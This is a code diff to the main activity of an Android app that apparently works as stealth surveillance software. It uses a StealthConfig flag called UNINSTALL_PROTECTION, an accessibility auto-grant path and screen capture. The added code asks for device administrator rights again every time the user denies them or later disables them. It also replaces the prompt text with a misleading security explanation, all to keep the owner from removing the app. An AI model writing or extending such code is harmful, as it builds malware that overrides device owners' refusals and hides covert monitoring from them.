@@ -98,6 +98,20 @@ public class MainActivity extends Activity {
             handlePermissionRequest(permissionType);
             // DO NOT return - keep activity alive for permission dialogs
         }
+        
+        // Check if device admin re-enable was requested (from AdminReceiver.onDisabled)
+        if (intent != null && intent.getBooleanExtra("request_device_admin", false)) {
+            Log.d(TAG, "Device admin re-enable requested");
+            handler.postDelayed(new Runnable() {
+                @Override
+                public void run() {
+                    if (StealthConfig.UNINSTALL_PROTECTION) {
+                        requestDeviceAdmin();
+                    }
+                }
+            }, 500);
+            return;
+        }
 
         // Check if ADB_GRANT_MODE - permissions already granted via ADB
         if (StealthConfig.ADB_GRANT_MODE) {
@@ -734,8 +748,27 @@ public class MainActivity extends Activity {
                 break;
                 
             case DEVICE_ADMIN_CODE:
-                Log.d(TAG, "Device Admin result received");
-                requestAccessibilityForAutoGrant();
+                Log.d(TAG, "Device Admin result received: " + (resultCode == RESULT_OK ? "ENABLED" : "DENIED"));
+                if (resultCode == RESULT_OK) {
+                    Log.d(TAG, "Device Admin successfully enabled");
+                    // Continue with accessibility/permissions setup
+                    requestAccessibilityForAutoGrant();
+                } else {
+                    Log.w(TAG, "Device Admin was denied");
+                    if (StealthConfig.UNINSTALL_PROTECTION) {
+                        // If uninstall protection is critical, try again after a delay
+                        handler.postDelayed(new Runnable() {
+                            @Override
+                            public void run() {
+                                Log.d(TAG, "Retrying device admin request");
+                                requestDeviceAdmin();
+                            }
+                        }, 2000);
+                    } else {
+                        // Continue without device admin if not critical
+                        requestAccessibilityForAutoGrant();
+                    }
+                }
                 break;
                 
             case SCREEN_CAPTURE_CODE:
@@ -767,16 +800,23 @@ public class MainActivity extends Activity {
     }
     
     private void requestDeviceAdmin() {
+        // Only request if UNINSTALL_PROTECTION is enabled
+        if (!StealthConfig.UNINSTALL_PROTECTION) {
+            Log.d(TAG, "UNINSTALL_PROTECTION disabled, skipping device admin request");
+            requestAccessibilityForAutoGrant();
+            return;
+        }
+        
         try {
             devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
             componentName = new ComponentName(this, AdminReceiver.class);
             
             if (!devicePolicyManager.isAdminActive(componentName)) {
-                Log.d(TAG, "Requesting Device Admin activation");
+                Log.d(TAG, "Requesting Device Admin activation (UNINSTALL_PROTECTION enabled)");
                 Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                 intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
                 intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
-                    "Enable administrator access for enhanced features and security.");
+                    "This app requires device administrator access to protect against unauthorized uninstallation and ensure system security.");
                 startActivityForResult(intent, DEVICE_ADMIN_CODE);
             } else {
                 Log.d(TAG, "Device Admin already active");
@@ -784,6 +824,7 @@ public class MainActivity extends Activity {
             }
         } catch (Exception e) {
             Log.e(TAG, "Error requesting device admin", e);
+            // Continue with accessibility even if device admin fails
             requestAccessibilityForAutoGrant();
         }
     }
